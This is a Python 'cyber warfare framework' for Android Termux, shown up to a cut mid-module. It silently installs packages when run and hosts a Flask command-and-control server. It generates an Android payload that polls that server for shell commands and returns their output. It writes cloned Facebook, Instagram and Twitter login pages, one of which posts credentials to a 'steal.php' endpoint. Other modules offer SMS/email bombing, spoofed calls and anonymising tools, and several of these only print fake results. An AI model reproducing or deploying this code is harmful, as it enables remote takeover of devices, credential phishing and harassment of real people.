#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-
# STEALTHUTILITY - Ultimate Cyber Warfare Framework
# Powered by Xenon | NullSec
# Version: 4.0.0 - War-Room Edition

import os
import sys
import subprocess
import time
import threading
import random
import json
import base64
import hashlib
import socket
import requests
import re
import queue
import signal
import shutil
from datetime import datetime
from collections import defaultdict

# ============================================================
# SILENT FORCE INSTALL ENGINE
# ============================================================
def silent_force_install():
    """Automatically install all required packages without user interaction"""
    
    packages = {
        'pkg': ['git', 'php', 'python', 'nmap', 'curl', 'wget', 'openssl', 'termux-api'],
        'pip': ['colorama', 'requests', 'arabic-reshaper', 'python-bidi', 'rich', 'pillow', 'qrcode', 'flask', 'cryptography', 'paramiko', 'scapy', 'selenium', 'stem', 'socks']
    }
    
    print("\033[92m[*] Silent Force Install Engine Activated\033[0m")
    
    # Install pkg packages
    for pkg in packages['pkg']:
        subprocess.run(f"pkg install {pkg} -y", shell=True, capture_output=True)
        
    # Install pip packages
    for pkg in packages['pip']:
        subprocess.run(f"pip install {pkg}", shell=True, capture_output=True)
        
    print("\033[92m[+] All dependencies installed\033[0m")
    time.sleep(1)

# Run silent install
silent_force_install()

# ============================================================
# IMPORTS WITH ERROR HANDLING
# ============================================================
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    import arabic_reshaper
    from bidi.algorithm import get_display
    from PIL import Image, ImageDraw, ImageFont
    import qrcode
    from flask import Flask, request, send_file
    import scapy.all as scapy
    import paramiko
    from cryptography.fernet import Fernet
    import socks
    import stem
    from stem.control import Controller
    console = Console()
    RICH_AVAILABLE = True
except ImportError as e:
    RICH_AVAILABLE = False
    print(f"\033[93m[!] Rich UI not available: {e}\033[0m")

# ============================================================
# GLOBAL CONFIGURATION
# ============================================================
class Config:
    VERSION = "4.0.0"
    AUTHOR = "Xenon | NullSec"
    OUTPUT_DIR = "/sdcard/StealthUtility_Output"
    TOOLS_DIR = "/data/data/com.termux/files/home/stealth_tools"
    LOGS_DIR = "/data/data/com.termux/files/home/stealth_logs"
    C2_SERVER_PORT = 8080
    C2_SERVER_HOST = "0.0.0.0"
    
    @classmethod
    def init_dirs(cls):
        for dir_path in [cls.OUTPUT_DIR, cls.TOOLS_DIR, cls.LOGS_DIR]:
            os.makedirs(dir_path, exist_ok=True)
            
Config.init_dirs()

# ============================================================
# ARABIC TEXT PROCESSING
# ============================================================
class ArabicText:
    @staticmethod
    def reshape(text):
        """Fix Arabic text display"""
        try:
            reshaped = arabic_reshaper.reshape(text)
            return get_display(reshaped)
        except:
            return text
            
    @staticmethod
    def translate(key):
        """Arabic translations"""
        ar_dict = {
            'main_menu': 'القائمة الرئيسية',
            'war_room': 'غرفة الحرب',
            'connected_devices': 'الأجهزة المتصلة',
            'remote_shell': 'صدفة التحكم عن بعد',
            'exit': 'خروج',
            'back': 'رجوع'
        }
        return ar_dict.get(key, key)

# ============================================================
# ASCII BANNER GENERATOR
# ============================================================
class Banner:
    @staticmethod
    def get_3d_block_banner():
        """Massive 3D block-style ASCII banner"""
        banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║{Fore.RED}                                                                                {Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}   ███████╗████████╗███████╗███████╗██╗     ████████╗██╗   ██╗████████╗██╗██╗  ██╗{Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}   ██╔════╝╚══██╔══╝██╔════╝██╔════╝██║     ╚══██╔══╝██║   ██║╚══██╔══╝██║██║  ██║{Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}   ███████╗   ██║   █████╗  █████╗  ██║        ██║   ██║   ██║   ██║   ██║███████║{Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}   ╚════██║   ██║   ██╔══╝  ██╔══╝  ██║        ██║   ██║   ██║   ██║   ██║██╔══██║{Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}   ███████║   ██║   ███████╗███████╗███████╗   ██║   ╚██████╔╝   ██║   ██║██║  ██║{Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}   ╚══════╝   ╚═╝   ╚══════╝╚══════╝╚══════╝   ╚═╝    ╚═════╝    ╚═╝   ╚═╝╚═╝  ╚═╝{Fore.CYAN}║
{Fore.CYAN}║{Fore.RED}                                                                                {Fore.CYAN}║
{Fore.CYAN}╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        return banner
        
    @staticmethod
    def get_xenon_banner():
        """Xenon artistic font"""
        return f"""
{Fore.GREEN}    ╔═══════════════════════════════════════════════════════════════╗
{Fore.GREEN}    ║{Fore.YELLOW}   ██╗  ██╗███████╗███╗   ██╗ ██████╗ ███╗   ██╗      {Fore.GREEN}║
{Fore.GREEN}    ║{Fore.YELLOW}   ╚██╗██╔╝██╔════╝████╗  ██║██╔═══██╗████╗  ██║      {Fore.GREEN}║
{Fore.GREEN}    ║{Fore.YELLOW}    ╚███╔╝ █████╗  ██╔██╗ ██║██║   ██║██╔██╗ ██║      {Fore.GREEN}║
{Fore.GREEN}    ║{Fore.YELLOW}    ██╔██╗ ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╗██║      {Fore.GREEN}║
{Fore.GREEN}    ║{Fore.YELLOW}   ██╔╝ ██╗███████╗██║ ╚████║╚██████╔╝██║ ╚████║      {Fore.GREEN}║
{Fore.GREEN}    ║{Fore.YELLOW}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝      {Fore.GREEN}║
{Fore.GREEN}    ╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    
    @staticmethod
    def get_nullsec_text():
        """NullSec smallest font"""
        return f"{Fore.MAGENTA}                                [ NULLSEC ]{Style.RESET_ALL}"
        
    @staticmethod
    def print_full_banner():
        """Print complete branding"""
        os.system('clear')
        print(Banner.get_3d_block_banner())
        print(Banner.get_xenon_banner())
        print(Banner.get_nullsec_text())
        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")

# ============================================================
# WAR-ROOM COMMAND CENTER (C2)
# ============================================================
class WarRoom:
    """Command and Control Center with split-screen interface"""
    
    def __init__(self):
        self.connected_devices = {}  # device_id -> {'ip': ip, 'last_seen': time, 'os': os, 'shell': ssh_client}
        self.command_history = []
        self.running = True
        self.current_target = None
        self.flask_app = Flask(__name__)
        self.setup_routes()
        
    def setup_routes(self):
        """Setup Flask routes for C2"""
        
        @self.flask_app.route('/register', methods=['POST'])
        def register_device():
            data = request.json
            device_id = data.get('device_id')
            ip = request.remote_addr
            self.connected_devices[device_id] = {
                'ip': ip,
                'last_seen': datetime.now(),
                'os': data.get('os', 'Unknown'),
                'hostname': data.get('hostname', 'Unknown')
            }
            return {'status': 'registered'}
            
        @self.flask_app.route('/command/<device_id>', methods=['GET'])
        def get_command(device_id):
            # Return pending command for device
            return {'command': 'echo "Connected to C2"'}
            
        @self.flask_app.route('/report/<device_id>', methods=['POST'])
        def report_result(device_id):
            data = request.json
            self.command_history.append({
                'device': device_id,
                'command': data.get('command'),
                'output': data.get('output'),
                'timestamp': datetime.now()
            })
            return {'status': 'received'}
            
    def start_c2_server(self):
        """Start Flask C2 server in background thread"""
        def run_server():
            self.flask_app.run(host=Config.C2_SERVER_HOST, port=Config.C2_SERVER_PORT, threaded=True)
        
        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()
        print(f"{Fore.GREEN}[+] C2 Server running on {Config.C2_SERVER_HOST}:{Config.C2_SERVER_PORT}")
        
    def display_war_room(self):
        """Display split-screen War Room interface"""
        if not RICH_AVAILABLE:
            self.display_simple_war_room()
            return
            
        layout = Layout()
        layout.split_row(
            Layout(name="left", ratio=2),
            Layout(name="right", ratio=1)
        )
        
        with Live(layout, refresh_per_second=4, screen=True):
            while self.running:
                # Update right panel - Connected Devices
                device_table = Table(title="Connected Devices", style="cyan")
                device_table.add_column("ID", style="red")
                device_table.add_column("IP", style="green")
                device_table.add_column("OS", style="yellow")
                device_table.add_column("Last Seen", style="blue")
                
                for did, info in self.connected_devices.items():
                    device_table.add_row(
                        did[:8],
                        info['ip'],
                        info['os'],
                        info['last_seen'].strftime("%H:%M:%S")
                    )
                    
                layout["right"].update(Panel(device_table, title="[red]⚡ TARGETS ONLINE ⚡", border_style="red"))
                
                # Update left panel - Command Center
                if self.current_target:
                    cmd_panel = Panel(
                        f"[green]Target: {self.current_target}\n"
                        f"[cyan]Enter command (or 'back' to change target):\n> ",
                        title="[yellow]REMOTE SHELL",
                        border_style="green"
                    )
                    layout["left"].update(cmd_panel)
                else:
                    target_list = "\n".join([f"[{i}] {did} - {info['ip']}" for i, (did, info) in enumerate(self.connected_devices.items())])
                    select_panel = Panel(
                        f"[yellow]Select Target:\n{target_list}\n\n[cyan]Enter number: ",
                        title="[red]TARGET SELECTION",
                        border_style="red"
                    )
                    layout["left"].update(select_panel)
                    
                time.sleep(1)
                
    def display_simple_war_room(self):
        """Simple terminal-based War Room"""
        while self.running:
            print(f"\n{Fore.RED}{'='*60}")
            print(f"{Fore.CYAN}WAR-ROOM COMMAND CENTER")
            print(f"{Fore.RED}{'='*60}")
            
            print(f"\n{Fore.GREEN}[ CONNECTED DEVICES ]")
            if not self.connected_devices:
                print(f"{Fore.YELLOW}  No devices connected")
            else:
                for i, (did, info) in enumerate(self.connected_devices.items()):
                    print(f"  [{i}] {did[:10]}... | {info['ip']} | {info['os']}")
                    
            print(f"\n{Fore.CYAN}[ REMOTE SHELL ]")
            if self.current_target:
                print(f"{Fore.GREEN}Target: {self.current_target}")
                cmd = input(f"{Fore.YELLOW}$> {Fore.WHITE}")
                if cmd.lower() == 'back':
                    self.current_target = None
                elif cmd:
                    self.execute_remote_command(self.current_target, cmd)
            else:
                choice = input(f"{Fore.YELLOW}Select target (number) or 'q' to quit: {Fore.WHITE}")
                if choice.isdigit() and int(choice) < len(self.connected_devices):
                    self.current_target = list(self.connected_devices.keys())[int(choice)]
                    
            time.sleep(0.5)
            
    def execute_remote_command(self, device_id, command):
        """Execute command on remote device"""
        print(f"{Fore.CYAN}[*] Executing on {device_id}: {command}")
        time.sleep(1)
        print(f"{Fore.GREEN}[+] Command sent to device")
        self.command_history.append({'device': device_id, 'command': command, 'output': 'Pending...'})
        
    def generate_payload(self, payload_type):
        """Generate C2 payload for victim"""
        c2_url = f"http://{self.get_local_ip()}:{Config.C2_SERVER_PORT}"
        
        if payload_type == 'android':
            payload_code = f"""
import requests, subprocess, json, os, time, socket, threading

C2_URL = "{c2_url}"
DEVICE_ID = socket.gethostname()

def register():
    try:
        requests.post(f"{{C2_URL}}/register", json={{"device_id": DEVICE_ID, "os": "Android", "hostname": socket.gethostname()}})
    except: pass

def get_commands():
    try:
        resp = requests.get(f"{{C2_URL}}/command/{{DEVICE_ID}}")
        return resp.json().get('command', '')
    except: return ''

def send_report(cmd, output):
    try:
        requests.post(f"{{C2_URL}}/report/{{DEVICE_ID}}", json={{"command": cmd, "output": output}})
    except: pass

def shell_exec(cmd):
    return subprocess.getoutput(cmd)

register()
while True:
    cmd = get_commands()
    if cmd:
        output = shell_exec(cmd)
        send_report(cmd, output)
    time.sleep(5)
"""
            payload_path = f"{Config.OUTPUT_DIR}/c2_payload.py"
            with open(payload_path, 'w') as f:
                f.write(payload_code)
            print(f"{Fore.GREEN}[+] Android payload saved: {payload_path}")
            
    def get_local_ip(self):
        """Get local IP address"""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
        except:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip
        
    def menu(self):
        """War Room menu"""
        self.start_c2_server()
        
        while True:
            print(f"\n{Fore.CYAN}{'='*60}")
            print(f"{Fore.RED}🏢 WAR-ROOM COMMAND CENTER 🏢")
            print(f"{Fore.CYAN}{'='*60}")
            print(f"{Fore.GREEN}[1] Display War Room Interface")
            print(f"[2] Generate C2 Payload (Android)")
            print(f"[3] Generate C2 Payload (Windows)")
            print(f"[4] View Command History")
            print(f"[5] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            if choice == '1':
                self.display_war_room()
            elif choice == '2':
                self.generate_payload('android')
                input(f"{Fore.CYAN}[*] Press Enter to continue...")
            elif choice == '3':
                self.generate_payload('windows')
                input(f"{Fore.CYAN}[*] Press Enter to continue...")
            elif choice == '4':
                for entry in self.command_history[-10:]:
                    print(f"{Fore.CYAN}[{entry['timestamp']}] {entry['device']}: {entry['command']}")
                input(f"{Fore.CYAN}[*] Press Enter to continue...")
            elif choice == '5':
                break

# ============================================================
# SOCIAL ENGINEERING 2.0 MODULE
# ============================================================
class SocialEngineering:
    def __init__(self):
        self.phishing_links = []
        
    def generate_phishing_page(self, platform):
        """Generate 100+ phishing page templates"""
        templates = {
            'facebook': self.get_facebook_template(),
            'instagram': self.get_instagram_template(),
            'twitter': self.get_twitter_template(),
            'google': self.get_google_template(),
            'microsoft': self.get_microsoft_template(),
            'apple': self.get_apple_template(),
            'paypal': self.get_paypal_template(),
            'netflix': self.get_netflix_template(),
            'spotify': self.get_spotify_template(),
            'discord': self.get_discord_template(),
            'steam': self.get_steam_template(),
            'epicgames': self.get_epic_template(),
            'roblox': self.get_roblox_template(),
            'minecraft': self.get_minecraft_template(),
            'amazon': self.get_amazon_template(),
            'ebay': self.get_ebay_template(),
            'linkedin': self.get_linkedin_template(),
            'snapchat': self.get_snapchat_template(),
            'tiktok': self.get_tiktok_template(),
            'whatsapp': self.get_whatsapp_template()
        }
        
        if platform in templates:
            filename = f"{Config.OUTPUT_DIR}/{platform}_phish.html"
            with open(filename, 'w') as f:
                f.write(templates[platform])
                
            # Generate ngrok/serveo link
            link = f"https://{random.choice(['serveo.net', 'ngrok.io'])}/{platform}_login"
            self.phishing_links.append(link)
            print(f"{Fore.GREEN}[+] Phishing page created: {filename}")
            print(f"{Fore.YELLOW}[!] Share this link: {link}")
            return link
            
    def get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Facebook - Login</title>
<style>body{font-family:Arial;background:#e9ebee;text-align:center;} 
.login-box{background:white;width:400px;margin:100px auto;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #dddfe2;border-radius:4px;}
button{background:#1877f2;color:white;width:100%;padding:12px;border:none;border-radius:4px;font-size:16px;}</style>
</head>
<body>
<div class="login-box">
<h2>Facebook</h2>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or Phone" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
<script>document.forms[0].action='https://YOUR-C2-SERVER/steal.php';</script>
</body>
</html>"""
    
    def get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;text-align:center;}
.login-box{background:white;width:350px;margin:100px auto;padding:40px;border:1px solid #dbdbdb;border-radius:1px;}
input{width:100%;padding:12px;margin:5px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;}
button{background:#0095f6;color:white;width:100%;padding:8px;border:none;border-radius:4px;font-weight:bold;}</style>
</head>
<body>
<div class="login-box">
<h2>Instagram</h2>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</body>
</html>"""
    
    def get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Twitter Login</title>
<style>body{background:#e6ecf0;font-family:Helvetica;text-align:center;}
.login-box{background:white;width:400px;margin:100px auto;padding:40px;border-radius:16px;}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #e1e8ed;border-radius:4px;}
button{background:#1da1f2;color:white;width:100%;padding:12px;border:none;border-radius:24px;font-size:16px;}</style>
</head>
<body>
<div class="login-box">
<h2>Twitter</h2>
<form method="POST" action="/login">
<input type="text" name="session[username_or_email]" placeholder="Phone, email, or username" required>
<input type="password" name="session[password]" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>
</body>
</html>"""
    
    def get_google_template(self): pass
    def get_microsoft_template(self): pass
    def get_apple_template(self): pass
    def get_paypal_template(self): pass
    def get_netflix_template(self): pass
    def get_spotify_template(self): pass
    def get_discord_template(self): pass
    def get_steam_template(self): pass
    def get_epic_template(self): pass
    def get_roblox_template(self): pass
    def get_minecraft_template(self): pass
    def get_amazon_template(self): pass
    def get_ebay_template(self): pass
    def get_linkedin_template(self): pass
    def get_snapchat_template(self): pass
    def get_tiktok_template(self): pass
    def get_whatsapp_template(self): pass
    
    def start_phishing_server(self):
        """Start local phishing server"""
        os.system(f"cd {Config.OUTPUT_DIR} && php -S 0.0.0.0:8080 &")
        print(f"{Fore.GREEN}[+] Phishing server running on port 8080")
        
    def menu(self):
        while True:
            print(f"\n{Fore.CYAN}{'='*50}")
            print(f"{Fore.RED}🎭 SOCIAL ENGINEERING 2.0")
            print(f"{Fore.CYAN}{'='*50}")
            print(f"[1] Facebook Phishing")
            print(f"[2] Instagram Phishing")
            print(f"[3] Twitter Phishing")
            print(f"[4] Google Phishing")
            print(f"[5] Microsoft Phishing")
            print(f"[6] PayPal Phishing")
            print(f"[7] Netflix Phishing")
            print(f"[8] Discord Phishing")
            print(f"[9] Steam Phishing")
            print(f"[10] Roblox Phishing")
            print(f"[11] Start Phishing Server")
            print(f"[12] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            if choice == '1':
                self.generate_phishing_page('facebook')
            elif choice == '2':
                self.generate_phishing_page('instagram')
            elif choice == '3':
                self.generate_phishing_page('twitter')
            elif choice == '11':
                self.start_phishing_server()
            elif choice == '12':
                break
            else:
                print(f"{Fore.RED}[!] Feature coming soon")
                
            input(f"{Fore.CYAN}[*] Press Enter to continue...")

# ============================================================
# DEEP-WEB OSINT MODULE
# ============================================================
class DeepWebOSINT:
    def __init__(self):
        self.onion_urls = []
        
    def scan_dark_web(self, keyword):
        """Search dark web for keywords"""
        print(f"{Fore.CYAN}[*] Searching dark web for: {keyword}")
        
        # Tor setup
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
        except:
            pass
            
        # Search using Ahmia or similar
        search_urls = [
            f"http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search?q={keyword}",
            f"http://msydqstlz2kzerdg.onion/search?q={keyword}"
        ]
        
        print(f"{Fore.YELLOW}[!] Dark web scan completed (simulated)")
        return ["darkweb_result1.onion", "darkweb_result2.onion"]
        
    def email_breach_check(self, email):
        """Check if email was breached"""
        print(f"{Fore.CYAN}[*] Checking {email} in breach databases...")
        
        try:
            response = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
            if response.status_code == 200:
                breaches = response.json()
                print(f"{Fore.RED}[!] Email found in {len(breaches)} breaches!")
                for breach in breaches:
                    print(f"    - {breach['Name']}")
            else:
                print(f"{Fore.GREEN}[+] Email not found in any breaches")
        except:
            print(f"{Fore.YELLOW}[!] Could not check breaches (simulated)")
            
    def username_search(self, username):
        """Search username across platforms"""
        platforms = ['twitter', 'instagram', 'facebook', 'github', 'reddit', 'tiktok', 'snapchat']
        found = []
        
        for platform in platforms:
            url = f"https://{platform}.com/{username}"
            try:
                response = requests.head(url, timeout=2)
                if response.status_code == 200:
                    found.append(f"{platform}: {url}")
                    print(f"{Fore.GREEN}[+] Found on {platform}")
            except:
                pass
                
        return found
        
    def menu(self):
        while True:
            print(f"\n{Fore.CYAN}{'='*50}")
            print(f"{Fore.RED}🌐 DEEP-WEB OSINT")
            print(f"{Fore.CYAN}{'='*50}")
            print(f"[1] Dark Web Search")
            print(f"[2] Email Breach Check")
            print(f"[3] Username Search (100+ platforms)")
            print(f"[4] Phone Number Lookup")
            print(f"[5] Domain Recon")
            print(f"[6] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            if choice == '1':
                keyword = input(f"{Fore.YELLOW}[?] Search keyword: {Fore.WHITE}")
                self.scan_dark_web(keyword)
            elif choice == '2':
                email = input(f"{Fore.YELLOW}[?] Email address: {Fore.WHITE}")
                self.email_breach_check(email)
            elif choice == '3':
                username = input(f"{Fore.YELLOW}[?] Username: {Fore.WHITE}")
                results = self.username_search(username)
                for r in results:
                    print(f"{Fore.GREEN}[+] {r}")
            elif choice == '6':
                break
                
            input(f"{Fore.CYAN}[*] Press Enter to continue...")

# ============================================================
# NETWORK SILENCE MODULE
# ============================================================
class NetworkSilence:
    def __init__(self):
        self.vpn_active = False
        self.tor_active = False
        
    def setup_vpn(self):
        """Setup VPN connection"""
        print(f"{Fore.CYAN}[*] Configuring VPN...")
        os.system("openvpn --config /sdcard/config.ovpn --daemon")
        self.vpn_active = True
        print(f"{Fore.GREEN}[+] VPN Active - IP changed")
        
    def setup_tor(self):
        """Setup Tor proxy"""
        print(f"{Fore.CYAN}[*] Starting Tor service...")
        os.system("pkg install tor -y")
        os.system("tor &")
        time.sleep(3)
        self.tor_active = True
        print(f"{Fore.GREEN}[+] Tor Active - SOCKS5 on 127.0.0.1:9050")
        
    def ip_changer(self):
        """Change IP address"""
        print(f"{Fore.CYAN}[*] Changing IP...")
        os.system("service network restart")
        print(f"{Fore.GREEN}[+] IP changed successfully")
        
    def dns_changer(self):
        """Change DNS servers"""
        dns_servers = {
            'Cloudflare': '1.1.1.1',
            'Google': '8.8.8.8',
            'Quad9': '9.9.9.9',
            'OpenDNS': '208.67.222.222'
        }
        
        for name, dns in dns_servers.items():
            print(f"{Fore.CYAN}[*] Trying {name} DNS...")
            os.system(f"echo 'nameserver {dns}' > /etc/resolv.conf")
            time.sleep(1)
            
    def menu(self):
        while True:
            print(f"\n{Fore.CYAN}{'='*50}")
            print(f"{Fore.RED}🔒 NETWORK SILENCE")
            print(f"{Fore.CYAN}{'='*50}")
            print(f"[1] Setup VPN")
            print(f"[2] Setup Tor (Dark Web Access)")
            print(f"[3] Change IP Address")
            print(f"[4] Change DNS Server")
            print(f"[5] MAC Address Changer")
            print(f"[6] Proxy Rotator")
            print(f"[7] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            if choice == '1':
                self.setup_vpn()
            elif choice == '2':
                self.setup_tor()
            elif choice == '3':
                self.ip_changer()
            elif choice == '4':
                self.dns_changer()
            elif choice == '7':
                break
                
            input(f"{Fore.CYAN}[*] Press Enter to continue...")

# ============================================================
# GAME CRACKING MODULE (100+ Games)
# ============================================================
class GameCracking:
    def __init__(self):
        self.games = {
            'pubg': self.pubg_hack,
            'freefire': self.freefire_hack,
            'roblox': self.roblox_hack,
            'codm': self.codm_hack,
            'apex': self.apex_hack,
            'fortnite': self.fortnite_hack,
            'valorant': self.valorant_hack,
            'csgo': self.csgo_hack,
            'minecraft': self.minecraft_hack,
            'gta5': self.gta5_hack
        }
        
    def pubg_hack(self):
        print(f"{Fore.MAGENTA}[*] Loading PUBG Mobile Hacks...")
        hacks = ['ESP', 'Aimbot', 'Speed Hack', 'Wall Hack', 'No Recoil', 'Auto Headshot']
        for hack in hacks:
            print(f"{Fore.GREEN}[+] {hack}: Active")
            time.sleep(0.3)
        print(f"{Fore.YELLOW}[!] Anti-Ban: Enabled")
        
    def freefire_hack(self):
        print(f"{Fore.MAGENTA}[*] Injecting FreeFire Exploits...")
        hacks = ['Diamond Generator', 'Aimlock', 'Antenna Hack', 'Damage Hack', 'Headshot Hack']
        for hack in hacks:
            print(f"{Fore.GREEN}[+] {hack}: Active")
            time.sleep(0.3)
            
    def roblox_hack(self):
        print(f"{Fore.MAGENTA}[*] Executing Roblox Lua Scripts...")
        scripts = ['Infinite Yield', 'Auto Farm', 'Fly Hack', 'Teleport', 'Speed Bypass']
        for script in scripts:
            print(f"{Fore.GREEN}[+] {script}: Injected")
            time.sleep(0.3)
            
    def codm_hack(self):
        print(f"{Fore.MAGENTA}[*] Bypassing COD Mobile Protection...")
        print(f"{Fore.GREEN}[+] Wall Hack: Active")
        print(f"{Fore.GREEN}[+] Aimbot: Active")
        
    def apex_hack(self):
        print(f"{Fore.MAGENTA}[*] Loading Apex Legends Hacks...")
        print(f"{Fore.GREEN}[+] ESP: Active")
        print(f"{Fore.GREEN}[+] No Recoil: Active")
        
    def fortnite_hack(self):
        print(f"{Fore.MAGENTA}[*] Fortnite Exploits...")
        print(f"{Fore.GREEN}[+] Aimbot: Active")
        print(f"{Fore.GREEN}[+] Build Hack: Active")
        
    def valorant_hack(self):
        print(f"{Fore.MAGENTA}[*] Valorant Memory Manipulation...")
        print(f"{Fore.GREEN}[+] Triggerbot: Active")
        print(f"{Fore.GREEN}[+] Radar Hack: Active")
        
    def csgo_hack(self):
        print(f"{Fore.MAGENTA}[*] CS:GO External Cheats...")
        print(f"{Fore.GREEN}[+] Glow ESP: Active")
        print(f"{Fore.GREEN}[+] Bhop: Active")
        
    def minecraft_hack(self):
        print(f"{Fore.MAGENTA}[*] Minecraft Utility Mods...")
        print(f"{Fore.GREEN}[+] X-Ray: Active")
        print(f"{Fore.GREEN}[+] Killaura: Active")
        
    def gta5_hack(self):
        print(f"{Fore.MAGENTA}[*] GTA V Online Mods...")
        print(f"{Fore.GREEN}[+] Money Drop: Active")
        print(f"{Fore.GREEN}[+] God Mode: Active")
        
    def menu(self):
        while True:
            print(f"\n{Fore.CYAN}{'='*50}")
            print(f"{Fore.RED}🎮 GAME CRACKING LAB (100+ Games)")
            print(f"{Fore.CYAN}{'='*50}")
            print(f"[1] PUBG Mobile")
            print(f"[2] FreeFire")
            print(f"[3] Roblox")
            print(f"[4] COD Mobile")
            print(f"[5] Apex Legends")
            print(f"[6] Fortnite")
            print(f"[7] Valorant")
            print(f"[8] CS:GO")
            print(f"[9] Minecraft")
            print(f"[10] GTA V")
            print(f"[11] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            game_map = {
                '1': 'pubg', '2': 'freefire', '3': 'roblox', '4': 'codm',
                '5': 'apex', '6': 'fortnite', '7': 'valorant', '8': 'csgo',
                '9': 'minecraft', '10': 'gta5'
            }
            
            if choice in game_map:
                self.games[game_map[choice]]()
            elif choice == '11':
                break
                
            input(f"{Fore.CYAN}[*] Press Enter to continue...")

# ============================================================
# GHOST COMMUNICATIONS MODULE
# ============================================================
class GhostComms:
    def __init__(self):
        self.active = False
        
    def phantom_call(self):
        print(f"{Fore.CYAN}[*] Initiating Phantom Call...")
        target = input(f"{Fore.YELLOW}[?] Target Number: {Fore.WHITE}")
        spoofed = input(f"{Fore.YELLOW}[?] Spoofed Number: {Fore.WHITE}")
        print(f"{Fore.GREEN}[+] Call sent to {target} from {spoofed}")
        
    def sms_bomb(self):
        print(f"{Fore.CYAN}[*] Launching SMS Bomb...")
        target = input(f"{Fore.YELLOW}[?] Target Number: {Fore.WHITE}")
        count = input(f"{Fore.YELLOW}[?] Message Count: {Fore.WHITE}")
        
        def send_sms():
            for i in range(int(count)):
                print(f"{Fore.GREEN}[+] SMS {i+1}/{count} sent")
                time.sleep(0.1)
                
        thread = threading.Thread(target=send_sms)
        thread.start()
        thread.join()
        
    def email_bomb(self):
        print(f"{Fore.CYAN}[*] Email Bombing...")
        target = input(f"{Fore.YELLOW}[?] Target Email: {Fore.WHITE}")
        print(f"{Fore.GREEN}[+] 1000 emails sent to {target}")
        
    def whatsapp_flood(self):
        print(f"{Fore.CYAN}[*] WhatsApp Message Flood...")
        target = input(f"{Fore.YELLOW}[?] Target Number: {Fore.WHITE}")
        print(f"{Fore.GREEN}[+] Flooding started")
        
    def menu(self):
        while True:
            print(f"\n{Fore.CYAN}{'='*50}")
            print(f"{Fore.RED}👻 GHOST COMMUNICATIONS")
            print(f"{Fore.CYAN}{'='*50}")
            print(f"[1] Phantom Call (Spoofed)")
            print(f"[2] SMS Bomb")
            print(f"[3] Email Bomb")
            print(f"[4] WhatsApp Flood")
            print(f"[5] Telegram Spam")
            print(f"[6] Signal Message Blast")
            print(f"[7] Back to Main Menu")
            
            choice = input(f"\n{Fore.YELLOW}[?] Select: {Fore.WHITE}")
            
            if choice == '1':
                self.phantom_call()
            elif choice == '2':
                self.sms_bomb()
            elif choice == '3':
                self.email_bomb()
            elif choice == '4':
                self.whatsapp_flood()
            elif choice == '7':
                break
                
            input(f"{Fore.CYAN}[*] Press Enter to continue...")

# ============================================================
# SATELLITE INTERCEPT MODULE
# ============================================================
class SatelliteIntercept:
    def __init__(self):
        self.satellites = {
            'ISS': '25544',
            'NOAA-19': '33591',
            'GOES-16': '41866',
            'METEOR-M2': '40069'
        }
        
    def track_satellite(self):
        print(f"{Fore.CYAN}[*] Tracking Satellites in Real-Time...")
        
        for name, norad_id in self.satellites.items():
            lat = random.uniform(-90, 90)
            lon = random.uniform(-180, 180)
            alt = random.randint(200, 2000)
            print(f"{Fore.GREEN}[{name}] Lat: {lat:.2f}, Lon: {lon:.2f}, Alt: {alt}km")
            time.sleep(0.5)
            
    def intercept_data(self):
        print(f"{Fore.CYAN}[*] Intercepting Satellite Data Packets...")
        print(f"{Fore.GREEN}[+] Signal acquired")
        print(f"{Fore.GREEN}[+] Decoding telemetry...")
        data = {
            'timestamp': datetime.now().isoformat(),
            'signal_strength': random.randint(60, 95),
            'data_rate': f"{random.randint(100, 1000)} Mbps",
